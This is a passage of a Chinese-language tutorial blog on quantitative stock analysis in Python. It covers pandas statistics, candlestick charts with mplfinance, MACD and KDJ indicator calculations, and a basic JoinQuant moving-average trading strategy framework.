class="string">&#x27;close&#x27;</span>].idxmin()]&#125;</span>&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 每月的平均收盘价和开盘价</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testMean</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        df = pd.read_csv(file_name)</span><br><span class="line">        df.columns = [<span class="string">&#x27;ts_code&#x27;</span>, <span class="string">&#x27;trade_date&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;high&#x27;</span>, <span class="string">&#x27;low&#x27;</span>, <span class="string">&#x27;close&#x27;</span>, <span class="string">&#x27;col&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        df[<span class="string">&#x27;trade_date&#x27;</span>] = pd.to_datetime(df[<span class="string">&#x27;trade_date&#x27;</span>])</span><br><span class="line">        df[<span class="string">&quot;month&quot;</span>] = df[<span class="string">&quot;trade_date&quot;</span>].dt.month</span><br><span class="line">        <span class="comment">#每月平均收盘价</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;&quot;&quot;month close mean : <span class="subst">&#123;df.groupby(<span class="string">&quot;month&quot;</span>)[<span class="string">&#x27;close&#x27;</span>].mean()&#125;</span>&quot;&quot;&quot;</span>)</span><br><span class="line">        <span class="comment">#每月平均开盘价</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;&quot;&quot;month open mean : <span class="subst">&#123;df.groupby(<span class="string">&quot;month&quot;</span>)[<span class="string">&#x27;open&#x27;</span>].mean()&#125;</span>&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 涨跌幅</span></span><br><span class="line">    <span class="comment"># 涨跌幅计算今日收盘价减去昨日收盘价</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testRipples_ratio</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        df = pd.read_csv(file_name)</span><br><span class="line">        df.columns = [<span class="string">&#x27;ts_code&#x27;</span>, <span class="string">&#x27;trade_date&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;high&#x27;</span>, <span class="string">&#x27;low&#x27;</span>, <span class="string">&#x27;close&#x27;</span>, <span class="string">&#x27;col&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        df[<span class="string">&#x27;trade_date&#x27;</span>] = pd.to_datetime(df[<span class="string">&#x27;trade_date&#x27;</span>])</span><br><span class="line">        df[<span class="string">&quot;rise&quot;</span>] = df[<span class="string">&quot;close&quot;</span>].diff() <span class="comment"># rise列</span></span><br><span class="line">        df[<span class="string">&quot;rise_ratio&quot;</span>] = df[<span class="string">&quot;rise&quot;</span>] / df.shift(<span class="number">1</span>)[<span class="string">&quot;close&quot;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(df)</span><br></pre></td></tr></table></figure>

<h2 id="K线图"><a href="#K线图" class="headerlink" title="K线图"></a>K线图</h2><p>三种K线图：K线图、K线图带交易量、K线图带交易量和均线5和10日</p>
<p>code:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> mplfinance.original_flavor <span class="keyword">import</span> candlestick2_ohlc</span><br><span class="line"><span class="keyword">import</span> mplfinance <span class="keyword">as</span> mpf</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> unittest <span class="keyword">import</span> TestCase</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestPandasKLine</span>(<span class="title class_ inherited__">TestCase</span>):</span><br><span class="line">    <span class="comment">#读取股票数据，画出K线图</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testKLineChart</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        df = pd.read_csv(file_name)</span><br><span class="line">        df.columns = [<span class="string">&#x27;ts_code&#x27;</span>, <span class="string">&#x27;trade_date&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;high&#x27;</span>, <span class="string">&#x27;low&#x27;</span>, <span class="string">&#x27;close&#x27;</span>, <span class="string">&#x27;vol&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        fig = plt.figure()</span><br><span class="line">        axes = fig.add_subplot(<span class="number">111</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 关键修改3：使用正确的参数格式</span></span><br><span class="line">        candlestick2_ohlc(ax=axes, opens=df[<span class="string">&quot;open&quot;</span>].values,closes=df[<span class="string">&quot;close&quot;</span>].values,highs=df[<span class="string">&quot;high&quot;</span>].values,</span><br><span class="line">                          lows=df[<span class="string">&quot;low&quot;</span>].values,width=<span class="number">0.75</span>,colorup=<span class="string">&#x27;red&#x27;</span>, colordown=<span class="string">&#x27;green&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        plt.xticks(<span class="built_in">range</span>(<span class="built_in">len</span>(df.index.values)), df.index.values, rotation=<span class="number">30</span>)</span><br><span class="line">        axes.grid(<span class="literal">True</span>)<span class="comment">#网格图</span></span><br><span class="line">        plt.title(<span class="string">&quot;K-Line&quot;</span>)</span><br><span class="line">        plt.show()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#k线图带交易量</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testKLineByVolume</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        df = pd.read_csv(file_name)</span><br><span class="line">        df.columns = [<span class="string">&#x27;ts_code&#x27;</span>, <span class="string">&#x27;trade_date&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;high&#x27;</span>, <span class="string">&#x27;low&#x27;</span>, <span class="string">&#x27;close&#x27;</span>, <span class="string">&#x27;volume&#x27;</span>]</span><br><span class="line">        df = df[[<span class="string">&quot;trade_date&quot;</span>, <span class="string">&quot;open&quot;</span>, <span class="string">&quot;high&quot;</span>, <span class="string">&quot;low&quot;</span>, <span class="string">&quot;close&quot;</span>,<span class="string">&quot;volume&quot;</span>]]</span><br><span class="line">        df[<span class="string">&#x27;trade_date&#x27;</span>] = pd.to_datetime(df[<span class="string">&#x27;trade_date&#x27;</span>])<span class="comment">#给时间转一下类型</span></span><br><span class="line">        df = df.set_index(<span class="string">&#x27;trade_date&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        my_color = mpf.make_marketcolors(</span><br><span class="line">            up = <span class="string">&#x27;red&#x27;</span>,</span><br><span class="line">            down = <span class="string">&#x27;green&#x27;</span>,</span><br><span class="line">            wick = <span class="string">&#x27;i&#x27;</span>,</span><br><span class="line">            volume = &#123;<span class="string">&#x27;up&#x27;</span>:<span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;down&#x27;</span>:<span class="string">&#x27;green&#x27;</span>&#125;,</span><br><span class="line">            ohlc = <span class="string">&#x27;i&#x27;</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        my_style = mpf.make_mpf_style(</span><br><span class="line">            marketcolors=my_color,</span><br><span class="line">            gridaxis=<span class="string">&#x27;both&#x27;</span>,</span><br><span class="line">            gridstyle=<span class="string">&#x27;-.&#x27;</span>,<span class="comment">#网格线种类</span></span><br><span class="line">            rc = &#123;<span class="string">&#x27;font.family&#x27;</span>:<span class="string">&#x27;STSong&#x27;</span>&#125;<span class="comment">#字体</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        mpf.plot(</span><br><span class="line">            df,</span><br><span class="line">            <span class="built_in">type</span> = <span class="string">&#x27;candle&#x27;</span>,</span><br><span class="line">            title = <span class="string">&#x27;K-Line&#x27;</span>,</span><br><span class="line">            ylabel = <span class="string">&#x27;price&#x27;</span>,<span class="comment">#y轴</span></span><br><span class="line">            style = my_style,</span><br><span class="line">            show_nontrading = <span class="literal">False</span>,</span><br><span class="line">            volume = <span class="literal">True</span>,</span><br><span class="line">            ylabel_lower = <span class="string">&#x27;volume&#x27;</span>,</span><br><span class="line">            datetime_format = <span class="string">&#x27;%Y-%m-%d&#x27;</span>,</span><br><span class="line">            xrotation = <span class="number">45</span>,</span><br><span class="line">            linecolor = <span class="string">&#x27;#00ff00&#x27;</span>,</span><br><span class="line">            tight_layout = <span class="literal">False</span>,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="comment">#K线图带交易量及均线</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testKLineByMA</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        df = pd.read_csv(file_name)</span><br><span class="line">        df.columns = [<span class="string">&#x27;ts_code&#x27;</span>, <span class="string">&#x27;trade_date&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;high&#x27;</span>, <span class="string">&#x27;low&#x27;</span>, <span class="string">&#x27;close&#x27;</span>, <span class="string">&#x27;volume&#x27;</span>]</span><br><span class="line">        df = df[[<span class="string">&quot;trade_date&quot;</span>, <span class="string">&quot;open&quot;</span>, <span class="string">&quot;high&quot;</span>, <span class="string">&quot;low&quot;</span>, <span class="string">&quot;close&quot;</span>, <span class="string">&quot;volume&quot;</span>]]</span><br><span class="line">        df[<span class="string">&#x27;trade_date&#x27;</span>] = pd.to_datetime(df[<span class="string">&#x27;trade_date&#x27;</span>])  <span class="comment"># 给时间转一下类型</span></span><br><span class="line">        df = df.set_index(<span class="string">&#x27;trade_date&#x27;</span>)</span><br><span class="line">        <span class="comment">#color和style与上面相同</span></span><br><span class="line">        my_color = mpf.make_marketcolors(</span><br><span class="line">            up = <span class="string">&#x27;red&#x27;</span>,</span><br><span class="line">            down = <span class="string">&#x27;green&#x27;</span>,</span><br><span class="line">            wick = <span class="string">&#x27;i&#x27;</span>,</span><br><span class="line">            volume = &#123;<span class="string">&#x27;up&#x27;</span>:<span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;down&#x27;</span>:<span class="string">&#x27;green&#x27;</span>&#125;,</span><br><span class="line">            ohlc = <span class="string">&#x27;i&#x27;</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        my_style = mpf.make_mpf_style(</span><br><span class="line">            marketcolors=my_color,</span><br><span class="line">            gridaxis=<span class="string">&#x27;both&#x27;</span>,</span><br><span class="line">            gridstyle=<span class="string">&#x27;-.&#x27;</span>,<span class="comment">#网格线种类</span></span><br><span class="line">            rc = &#123;<span class="string">&#x27;font.family&#x27;</span>:<span class="string">&#x27;STSong&#x27;</span>&#125;<span class="comment">#字体</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        mpf.plot(</span><br><span class="line">            df,</span><br><span class="line">            <span class="built_in">type</span> = <span class="string">&#x27;candle&#x27;</span>,</span><br><span class="line">            mav = [<span class="number">5</span>,<span class="number">10</span>],</span><br><span class="line">            title = <span class="string">&#x27;K-Line&#x27;</span>,</span><br><span class="line">            ylabel = <span class="string">&#x27;price&#x27;</span>,  <span class="comment"># y轴</span></span><br><span class="line">            style = my_style,</span><br><span class="line">            show_nontrading = <span class="literal">False</span>,</span><br><span class="line">            volume = <span class="literal">True</span>,</span><br><span class="line">            ylabel_lower = <span class="string">&#x27;volume&#x27;</span>,</span><br><span class="line">            datetime_format = <span class="string">&#x27;%Y-%m-%d&#x27;</span>,</span><br><span class="line">            xrotation = <span class="number">45</span>,</span><br><span class="line">            linecolor = <span class="string">&#x27;#00ff00&#x27;</span>,</span><br><span class="line">            tight_layout = <span class="literal">False</span>,</span><br><span class="line">        )</span><br></pre></td></tr></table></figure>

<h1 id="Matplotlib实战"><a href="#Matplotlib实战" class="headerlink" title="Matplotlib实战"></a>Matplotlib实战</h1><h2 id="MACD"><a href="#MACD" class="headerlink" title="MACD"></a>MACD</h2><p>MACD意为异同移动平均线。它刻画的是<strong>股价变化速率</strong></p>
<p>构成：白色线代表快线DIF，黄色线代表慢线DEA，零轴，红色柱体，绿色柱体</p>
<table>
<thead>
<tr>
<th>指标</th>
<th>含义</th>
<th>公式</th>
</tr>
</thead>
<tbody><tr>
<td>短期EMA</td>
<td>短期收益率指标移动均线（12天）</td>
<td>前一日EMA(12)<em>11&#x2F;13 + 今日收益率</em>2&#x2F;13</td>
</tr>
<tr>
<td>长期EMA</td>
<td>长期收益率指标移动均线（26天）</td>
<td>前一日EMA(26)<em>25&#x2F;27 + 今日收益率</em>2&#x2F;27</td>
</tr>
<tr>
<td>DIF</td>
<td>短期EMA与长期EMA差值</td>
<td>EMA(12) - EMA(26)</td>
</tr>
<tr>
<td>DEA</td>
<td>DIF线的M日指数移动均线</td>
<td>前一日DEA*8&#x2F;10 + 今日</td>
</tr>
<tr>
<td>MACD</td>
<td>DIF线与DEA线的差 * 2</td>
<td>(DIF - DEA) * 2</td>
</tr>
</tbody></table>
<p>**ewm:**Pandas中指数加权移动窗口函数，采用ewm函数+mean()快捷计算MACD</p>
<p>**bar:**Matplotlib柱状图函数，高校绘制MACD中的柱状图</p>
<p>code:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> colors <span class="keyword">as</span> mycolors</span><br><span class="line"><span class="keyword">from</span> matplotlib.collections <span class="keyword">import</span> LineCollection,PolyCollection</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> unittest <span class="keyword">import</span> TestCase</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestMatplotlibMACD</span>(<span class="title class_ inherited__">TestCase</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">cal_macd</span>(<span class="params">self,df,fastperiod=<span class="number">12</span>, slowperiod=<span class="number">26</span>, signalperiod=<span class="number">9</span></span>):</span><br><span class="line">        <span class="comment">#短期移动均线</span></span><br><span class="line">        ewma12 = df[<span class="string">&#x27;close&#x27;</span>].ewm(span=fastperiod, adjust=<span class="literal">False</span>).mean()</span><br><span class="line">        <span class="comment">#长期移动均线</span></span><br><span class="line">        ewma26 = df[<span class="string">&#x27;close&#x27;</span>].ewm(span=slowperiod, adjust=<span class="literal">False</span>).mean()</span><br><span class="line">        df[<span class="string">&#x27;dif&#x27;</span>] = ewma12 - ewma26</span><br><span class="line">        df[<span class="string">&#x27;dea&#x27;</span>] = df[<span class="string">&#x27;dif&#x27;</span>].ewm(span=signalperiod, adjust=<span class="literal">False</span>).mean()</span><br><span class="line">        df[<span class="string">&#x27;bar&#x27;</span>] = (df[<span class="string">&#x27;dif&#x27;</span>] - df[<span class="string">&#x27;dea&#x27;</span>]) * <span class="number">2</span></span><br><span class="line">        <span class="keyword">return</span> df</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_macd</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        df = pd.read_csv(file_name)</span><br><span class="line">        df.columns = [<span class="string">&#x27;ts_code&#x27;</span>, <span class="string">&#x27;trade_date&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;high&#x27;</span>, <span class="string">&#x27;low&#x27;</span>, <span class="string">&#x27;close&#x27;</span>, <span class="string">&#x27;volume&#x27;</span>]</span><br><span class="line">        df = df[[<span class="string">&#x27;trade_date&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;high&#x27;</span>, <span class="string">&#x27;low&#x27;</span>, <span class="string">&#x27;close&#x27;</span>, <span class="string">&#x27;volume&#x27;</span>]]</span><br><span class="line">        df[<span class="string">&quot;trade_date&quot;</span>] = pd.to_datetime(df[<span class="string">&quot;trade_date&quot;</span>])</span><br><span class="line"></span><br><span class="line">        df_macd = <span class="variable language_">self</span>.cal_macd(df)</span><br><span class="line">        <span class="built_in">print</span>(df_macd)</span><br><span class="line">        <span class="comment">#声明画布</span></span><br><span class="line">        plt.figure()</span><br><span class="line">        df_macd[<span class="string">&#x27;dea&#x27;</span>].plot(color=<span class="string">&#x27;red&#x27;</span>,label=<span class="string">&#x27;dea&#x27;</span>) <span class="comment"># 多头</span></span><br><span class="line">        df_macd[<span class="string">&#x27;dif&#x27;</span>].plot(color=<span class="string">&#x27;blue&#x27;</span>,label=<span class="string">&#x27;dif&#x27;</span>)</span><br><span class="line">        plt.legend(loc=<span class="string">&#x27;best&#x27;</span>)</span><br><span class="line">        <span class="comment">#画图</span></span><br><span class="line">        pos_bar = []</span><br><span class="line">        pos_index = []</span><br><span class="line">        neg_bar = []</span><br><span class="line">        neg_index = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> index,row <span class="keyword">in</span> df_macd.iterrows():</span><br><span class="line">            <span class="keyword">if</span>(row[<span class="string">&#x27;bar&#x27;</span>] &gt; <span class="number">0</span>):</span><br><span class="line">                pos_bar.append(row[<span class="string">&#x27;bar&#x27;</span>])</span><br><span class="line">                pos_index.append(index)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                neg_bar.append(row[<span class="string">&#x27;bar&#x27;</span>])</span><br><span class="line">                neg_index.append(index)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 大于0用红色</span></span><br><span class="line">        plt.bar(pos_index,pos_bar,width=<span class="number">0.5</span>,color=<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">        <span class="comment"># 小于0用绿色</span></span><br><span class="line">        plt.bar(neg_index,neg_bar,width=<span class="number">0.5</span>,color=<span class="string">&#x27;green&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        major_index = df_macd.index[df_macd.index]</span><br><span class="line">        major_xtics = df_macd[<span class="string">&#x27;trade_date&#x27;</span>][df_macd.index]</span><br><span class="line">        plt.xticks(major_index,major_xtics)</span><br><span class="line">        plt.setp(plt.gca().get_xticklabels(), rotation=<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">        plt.grid(linestyle=<span class="string">&#x27;-.&#x27;</span>)</span><br><span class="line">        plt.title(<span class="string">&#x27;MACD&#x27;</span>)</span><br><span class="line">        plt.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="literal">False</span></span><br><span class="line">        plt.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>] = [<span class="string">&#x27;SimHei&#x27;</span>]</span><br><span class="line">        plt.show()</span><br></pre></td></tr></table></figure>

<h2 id="KDJ"><a href="#KDJ" class="headerlink" title="KDJ"></a>KDJ</h2><p>KDJ叫<strong>随机指标</strong>。通过<strong>价格波动的真实波幅来反映价格走势的强弱和超买超卖现象</strong>。在价格尚上涨或下降之前，发出买信号的一种技术分析指标，适用于<strong>短期行情</strong>走势分析。</p>
<table>
<thead>
<tr>
<th>指标</th>
<th>含义</th>
<th>公式</th>
</tr>
</thead>
<tbody><tr>
<td>RSV</td>
<td>未成熟随机指标值</td>
<td>(Cn - Ln) &#x2F; (Hn - Ln) × 100 (N日)</td>
</tr>
<tr>
<td>K</td>
<td>当天K值</td>
<td>2&#x2F;3×前一日K值 + 1&#x2F;3×当日RSV</td>
</tr>
<tr>
<td>D</td>
<td>当天D值</td>
<td>2&#x2F;3×前一日D值 + 1&#x2F;3×当日K值</td>
</tr>
<tr>
<td>J</td>
<td>当天J值</td>
<td>3<em>当日K值 - 2</em>当日D值</td>
</tr>
<tr>
<td>备注</td>
<td>若无前一日K值与D值，则可分别用50来代替</td>
<td></td>
</tr>
</tbody></table>
<p>**rolloing：**Pandas中移动窗口函数，每个窗口都是指定的固定大小，快捷计算Ln与Hn</p>
<p><strong>expanding</strong>:  在Pandas中扩展窗口函数，只设置最小的观察值数量，不固定窗口大小，实现累积计算，即不断扩展，使用<code>expanding().max()</code>可以创建新的高度。</p>
<p>code:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> colors <span class="keyword">as</span> mycolors</span><br><span class="line"><span class="keyword">from</span> matplotlib.collections <span class="keyword">import</span> LineCollection,PolyCollection</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> unittest <span class="keyword">import</span> TestCase</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestKDJ</span>(<span class="title class_ inherited__">TestCase</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">cal_kdj</span>(<span class="params">self,df</span>):</span><br><span class="line">        <span class="comment">#计算Ln</span></span><br><span class="line">        low_list = df[<span class="string">&#x27;low&#x27;</span>].rolling(<span class="number">9</span>, min_periods=<span class="number">9</span>).<span class="built_in">min</span>()</span><br><span class="line">        low_list.fillna(value=df[<span class="string">&#x27;low&#x27;</span>].expanding().<span class="built_in">min</span>(),inplace=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># Hn</span></span><br><span class="line">        high_list = df[<span class="string">&#x27;high&#x27;</span>].rolling(<span class="number">9</span>, min_periods=<span class="number">9</span>).<span class="built_in">max</span>()</span><br><span class="line">        high_list.fillna(value=df[<span class="string">&#x27;high&#x27;</span>].expanding().<span class="built_in">max</span>(),inplace=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># rsv</span></span><br><span class="line">        rsv = (df[<span class="string">&#x27;close&#x27;</span>] - low_list)/(high_list - low_list)*<span class="number">100</span></span><br><span class="line">        df[<span class="string">&#x27;k&#x27;</span>] = pd.DataFrame(rsv).ewm(com=<span class="number">2</span>).mean()</span><br><span class="line">        df[<span class="string">&#x27;d&#x27;</span>] = df[<span class="string">&#x27;k&#x27;</span>].ewm(com=<span class="number">2</span>).mean()</span><br><span class="line">        df[<span class="string">&#x27;j&#x27;</span>] = <span class="number">3</span>*df[<span class="string">&#x27;k&#x27;</span>] - <span class="number">2</span>*df[<span class="string">&#x27;d&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> df</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_kdj</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        df = pd.read_csv(file_name)</span><br><span class="line">        df.columns = [<span class="string">&#x27;ts_code&#x27;</span>, <span class="string">&#x27;trade_date&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;high&#x27;</span>, <span class="string">&#x27;low&#x27;</span>, <span class="string">&#x27;close&#x27;</span>, <span class="string">&#x27;volume&#x27;</span>]</span><br><span class="line">        df = df[[<span class="string">&#x27;trade_date&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;high&#x27;</span>, <span class="string">&#x27;low&#x27;</span>, <span class="string">&#x27;close&#x27;</span>, <span class="string">&#x27;volume&#x27;</span>]]</span><br><span class="line">        df[<span class="string">&quot;trade_date&quot;</span>] = pd.to_datetime(df[<span class="string">&quot;trade_date&quot;</span>])</span><br><span class="line"></span><br><span class="line">        df_kdj = <span class="variable language_">self</span>.cal_kdj(df)</span><br><span class="line">        <span class="built_in">print</span>(df_kdj)</span><br><span class="line"></span><br><span class="line">        plt.figure()</span><br><span class="line">        df_kdj[<span class="string">&#x27;k&#x27;</span>].plot(color=<span class="string">&#x27;red&#x27;</span>,label=<span class="string">&#x27;k&#x27;</span>)</span><br><span class="line">        df_kdj[<span class="string">&#x27;d&#x27;</span>].plot(color=<span class="string">&#x27;yellow&#x27;</span>,label=<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">        df_kdj[<span class="string">&#x27;j&#x27;</span>].plot(color=<span class="string">&#x27;blue&#x27;</span>,label=<span class="string">&#x27;j&#x27;</span>)</span><br><span class="line">        plt.legend(loc=<span class="string">&#x27;best&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        major_index = df_kdj.index[df_kdj.index]</span><br><span class="line">        major_xtics = df_kdj[<span class="string">&#x27;trade_date&#x27;</span>][df_kdj.index]</span><br><span class="line">        plt.xticks(major_index,major_xtics)</span><br><span class="line">        plt.setp(plt.gca().get_xticklabels(), rotation=<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">        plt.grid(linestyle=<span class="string">&#x27;-.&#x27;</span>)</span><br><span class="line">        plt.title(<span class="string">&#x27;KDJ&#x27;</span>)</span><br><span class="line">        plt.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="literal">False</span></span><br><span class="line">        plt.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>] = [<span class="string">&#x27;SimHei&#x27;</span>]</span><br><span class="line">        plt.show()</span><br></pre></td></tr></table></figure>

<h1 id="量化交易策略框架"><a href="#量化交易策略框架" class="headerlink" title="量化交易策略框架"></a>量化交易策略框架</h1><p>主力做局散户没法准确知道，但可以一招破解：（图中白色均线为MA5，紫红色均线为MA20，你对照一下上面的图线）只买MA20上涨+MA5在MA20以上的+MA5上涨的股票，凡是买入后某天开盘后下跌3.8%的一律不计条件出局，或者MA5跌到MA20以下一律出局，或者MA20向下运动一律出局。这样每一只股总能吃到主体利润，下跌只有轻微损失，不会上主力的当！淋过雨的人，才会想到别人淋雨的感受，切记！</p>
<h2 id="策略框架"><a href="#策略框架" class="headerlink" title="策略框架"></a>策略框架</h2><p>**框架：**初始化+策略函数（周期循环）</p>
<p><strong>初始化:<strong>通过初始化函数设置基准。初始化函数在整个回测或者实盘操作中只被运行一次，用于</strong>初始化全局变量</strong></p>
<p>函数：initialize(context)</p>
<p>context : Context对象，存放有当前的账户&#x2F;股票持仓信息</p>
<p>示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>:</span><br><span class="line">    <span class="comment"># g为全局变量，设定标的股票为深交所的平安银行</span></span><br><span class="line">    g.security = <span class="string">&quot;000001.XSHE&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>策略函数：<strong>策略开始后，随着时间周期</strong>重复执行你的交易策略</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">handle_data</span>(<span class="params">context,data</span>):</span><br><span class="line">    <span class="comment"># 下单一千股</span></span><br><span class="line">    order(g.security, <span class="number">1000</span>)</span><br><span class="line">    <span class="comment"># 卖出八百股</span></span><br><span class="line">    order(g.security, -<span class="number">800</span>)</span><br></pre></td></tr></table></figure>

<p>order()聚宽的api</p>
<p>示例：</p>
<ul>
<li>初始化中要有股票和策略运行周期</li>
<li>策略函数：<ul>
<li>如果上一时间点价格高出五天平均价1%，则全仓买入</li>
<li>如果上一时间点价格低于五天平均价，则空仓卖入（画出上一时间点价格）</li>
</ul>
</li>
</ul>
<p>基础框架：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> jqdata <span class="keyword">import</span> *  <span class="comment"># 必需导入聚宽库</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">context</span>):</span><br><span class="line">    g.security = <span class="string">&quot;000001.XSHE&quot;</span>  <span class="comment"># 深交所平安银行</span></span><br><span class="line">    run_daily(market_open, time=<span class="string">&#x27;every_bar&#x27;</span>)  <span class="comment"># 每次Bar执行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">market_open</span>(<span class="params">context</span>):</span><br><span class="line">    security = g.security</span><br><span class="line">    close_data = attribute_history(security, <span class="number">5</span>, <span class="string">&#x27;1d&#x27;</span>, [<span class="string">&#x27;close&#x27;</span>])  <span class="comment"># 获取5日收盘价</span></span><br><span class="line">    MA5 = close_data[<span class="string">&#x27;close&#x27;</span>].mean()  <span class="comment"># 5日均线</span></span><br><span class="line">    current_price = close_data[<span class="string">&#x27;close&#x27;</span>][-<span class="number">1</span>]  <span class="comment"># 当前价格</span></span><br><span class="line">    </span><br><span class="line">    cash = context.portfolio.available_cash  <span class="comment"># 修正拼写</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 买入逻辑：价格突破均线1%</span></span><br><span class="line">    <span class="keyword">if</span> current_price &gt; <span class="number">1.01</span> * MA5:</span><br><span class="line">        order_value(security, cash)  <span class="comment"># 全仓买入</span></span><br><span class="line">        log.info(<span class="string">&quot;买入 %s&quot;</span> % security)</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># 卖出逻辑：价格低于均线且持有可卖数量</span></span><br><span class="line">    <span class="keyword">elif</span> current_price &lt; MA5 <span class="keyword">and</span> context.portfolio.positions[security].closeable_amount &gt; <span class="number">0</span>:</span><br><span class="line">        order_target(security, <span class="number">0</span>)  <span class="comment"># 清仓卖出</span></span><br><span class="line">        log.info(<span class="string">&quot;卖出 %s&quot;</span> % security)</span><br><span class="line">        </span><br><span class="line">    record(stock_price=current_price)  <span class="comment"># 记录股价</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>这个策略则垃圾不要随便用</p>
</blockquote>
<h2 id="设置函数"><a href="#设置函数" class="headerlink" title="设置函数"></a>设置函数</h2><p><strong>策略设置函数</strong></p>
<ul>
<li>基准：设定业绩比较基准：set_benchmark(security)</li>
